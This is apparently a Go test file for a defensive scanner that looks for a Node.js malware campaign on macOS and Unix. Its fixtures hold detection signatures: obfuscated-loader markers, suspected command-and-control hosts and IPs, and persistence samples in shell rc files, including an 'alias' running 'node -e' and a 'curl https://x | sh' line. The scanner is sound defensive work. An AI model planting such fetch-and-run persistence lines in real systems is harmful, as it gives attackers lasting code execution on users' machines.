//go:build !windows

package main

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestParseProcessOutput(t *testing.T) {
	// Format matches `ps -wwaxo pid=,user=,command=` output (no header,
	// 3 columns: pid, user, full command with args).
	output := `    1 root /sbin/launchd
 1234 user node -e global["!"] something malicious
 5678 user node /usr/local/bin/legit-app
 9012 user node app.js _V something =-22 payload
 3456 user node server.js Gez(encoded)
 7777 user node active-scan --port 9847
 4444 user /usr/local/bin/loader -e global["!"] renamed-binary-still-detected
 5555 user bun run /tmp/x.js Gez(payload)`

	hits := parseProcessOutput(output, 99999)

	if len(hits) != 5 {
		t.Fatalf("got %d hits, want 5", len(hits))
	}

	expected := []struct {
		pid    int
		reason string
	}{
		{1234, "eval with global[] access"},
		{9012, "_V=-22 signature in command"},
		{3456, "Gez() call in command"},
		{4444, "eval with global[] access"},
		{5555, "Gez() call in command"},
	}
	for i, want := range expected {
		if hits[i].PID != want.pid {
			t.Errorf("hit[%d].PID = %d, want %d", i, hits[i].PID, want.pid)
		}
		if hits[i].Reason != want.reason {
			t.Errorf("hit[%d].Reason = %q, want %q", i, hits[i].Reason, want.reason)
		}
	}
}

func TestParseProcessOutputSkipsSelf(t *testing.T) {
	output := ` 1234 user node -e global["!"] payload`

	hits := parseProcessOutput(output, 1234)
	if len(hits) != 0 {
		t.Errorf("should skip own PID, got %d hits", len(hits))
	}
}

func TestParseProcessOutputSkipsActiveScan(t *testing.T) {
	output := ` 7777 user node active-scan --port 9847`

	hits := parseProcessOutput(output, 99999)
	if len(hits) != 0 {
		t.Errorf("should skip active-scan processes, got %d hits", len(hits))
	}
}

func TestParseProcessOutputEmpty(t *testing.T) {
	hits := parseProcessOutput("", 1)
	if len(hits) != 0 {
		t.Errorf("empty input should return nil, got %d hits", len(hits))
	}
}

func TestParseNetworkOutput(t *testing.T) {
	// Both node and non-node processes connecting to C2 hosts are flagged
	// after dropping the "node" pre-filter on matchNetworkLine.
	output := `COMMAND     PID   USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME
node      12345   user   20u  IPv4 0x1234567890     0t0  TCP 192.168.1.5:54321->trongrid.io:443 (ESTABLISHED)
node      12346   user   21u  IPv4 0x1234567891     0t0  TCP 192.168.1.5:54322->google.com:443 (ESTABLISHED)
loader    12347   user   22u  IPv4 0x1234567892     0t0  TCP 192.168.1.5:54323->aptoslabs.com:443 (ESTABLISHED)
node      12348   user   23u  IPv4 0x1234567893     0t0  TCP 192.168.1.5:54324->136.0.9.8:8080 (ESTABLISHED)`

	hits := parseNetworkOutput(output)

	if len(hits) != 3 {
		t.Fatalf("got %d hits, want 3", len(hits))
	}

	if hits[0].PID != 12345 || hits[0].Host != "trongrid" {
		t.Errorf("hit[0] = {PID:%d Host:%q}, want {PID:12345 Host:trongrid}", hits[0].PID, hits[0].Host)
	}
	if hits[1].PID != 12347 || hits[1].Host != "aptoslabs" {
		t.Errorf("hit[1] = {PID:%d Host:%q}, want {PID:12347 Host:aptoslabs}", hits[1].PID, hits[1].Host)
	}
	if hits[2].PID != 12348 || hits[2].Host != "136.0.9.8" {
		t.Errorf("hit[2] = {PID:%d Host:%q}, want {PID:12348 Host:136.0.9.8}", hits[2].PID, hits[2].Host)
	}
}

func TestParseNetworkOutputEmpty(t *testing.T) {
	hits := parseNetworkOutput("")
	if len(hits) != 0 {
		t.Errorf("empty input should return nil, got %d hits", len(hits))
	}
}

func TestScanFileForPersistence(t *testing.T) {
	dir := t.TempDir()

	tests := []struct {
		name         string
		filename     string
		content      string
		descriptor   string
		write        bool
		wantHits     int
		wantInDetail string
	}{
		{
			name:         "shell rc with node -e",
			filename:     "zshrc",
			content:      `alias x='node -e "payload"'`,
			descriptor:   "shell rc",
			write:        true,
			wantHits:     1,
			wantInDetail: "node -e",
		},
		{
			name:         "shell rc with curl piped to sh",
			filename:     "bashrc",
			content:      `function evil() { curl https://x | sh; }`,
			descriptor:   "shell rc",
			write:        true,
			wantHits:     1,
			wantInDetail: "curl | sh",
		},
		{
			name:         "launchd plist with wallet id",
			filename:     "com.evil.plist",
			content:      `<plist><dict><key>Label</key><string>A7-2259</string></dict></plist>`,
			descriptor:   "system LaunchDaemon",
			write:        true,
			wantHits:     1,
			wantInDetail: "A7-2259",
		},
		{
			name:         "plist with persist keyword",
			filename:     "com.trongrid.plist",
			content:      `<plist><dict><key>ProgramArguments</key><array><string>trongrid</string></array></dict></plist>`,
			descriptor:   "system LaunchAgent",
			write:        true,
			wantHits:     1,
			wantInDetail: "trongrid",
		},
		{
			name:       "clean shell rc",
			filename:   "clean",
			content:    "alias ll='ls -la'\nexport PATH=$PATH:/usr/local/bin\n",
			descriptor: "shell rc",
			write:      true,
			wantHits:   0,
		},
		{
			name:       "nonexistent file silently skipped",
			filename:   "does-not-exist",
			descriptor: "shell rc",
			write:      false,
			wantHits:   0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			path := filepath.Join(dir, tt.filename)
			if tt.write {
				if err := os.WriteFile(path, []byte(tt.content), 0o644); err != nil {
					t.Fatal(err)
				}
			}
			hits := scanFileForPersistence(path, tt.descriptor)
			if len(hits) != tt.wantHits {
				t.Errorf("got %d hits, want %d: %+v", len(hits), tt.wantHits, hits)
			}
			if tt.wantHits > 0 && tt.wantInDetail != "" {
				var found bool
				for _, h := range hits {
					if strings.Contains(h.Detail, tt.wantInDetail) {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected detail to contain %q, got: %+v", tt.wantInDetail, hits)
				}
			}
		})
	}
}

func TestScanLaunchDirSkipsSelf(t *testing.T) {
	dir := t.TempDir()
	// Self-named plist should be ignored even if its content matches.
	selfPath := filepath.Join(dir, "com.hegner123.active-scan.plist")
	if err := os.WriteFile(selfPath, []byte(`<plist>trongrid</plist>`), 0o644); err != nil {
		t.Fatal(err)
	}
	// A normal plist with a marker should be detected.
	evilPath := filepath.Join(dir, "com.evil.plist")
	if err := os.WriteFile(evilPath, []byte(`<plist>trongrid</plist>`), 0o644); err != nil {
		t.Fatal(err)
	}
	hits := scanLaunchDir(dir, "system LaunchDaemon")
	if len(hits) != 1 {
		t.Fatalf("got %d hits, want 1 (active-scan plist must be ignored): %+v", len(hits), hits)
	}
	if !strings.Contains(hits[0].Detail, "com.evil.plist") {
		t.Errorf("expected hit for com.evil.plist, got %q", hits[0].Detail)
	}
}

func TestScanProcessesReturnsClean(t *testing.T) {
	ctx := context.Background()
	detections := scanProcesses(ctx)
	if len(detections) != 0 {
		t.Logf("WARNING: detected %d suspicious processes on this system", len(detections))
	}
}

func TestScanNetworkReturnsClean(t *testing.T) {
	ctx := context.Background()
	detections := scanNetwork(ctx)
	if len(detections) != 0 {
		t.Logf("WARNING: detected %d suspicious network connections on this system", len(detections))
	}
}
